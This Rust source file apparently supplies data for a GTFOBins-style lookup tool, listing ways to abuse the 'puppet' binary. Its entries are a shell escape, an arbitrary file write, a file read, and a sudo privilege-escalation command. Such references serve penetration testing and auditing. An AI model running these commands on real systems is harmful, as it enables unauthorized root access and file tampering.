pub static BIN_NAME: &'static str = "puppet";
pub static SH_CODE: &'static str = r#"
    
    puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
"#;
pub static FW_DESC: &'static str = "The file path must be absolute.";
pub static FW_CODE: &'static str = r#"
    
    LFILE="/tmp/file_to_write"
    puppet apply -e "file { '$LFILE': content => 'DATA' }"
"#;
pub static FR_DESC: &'static str = "The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    puppet filebucket -l diff /dev/null $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
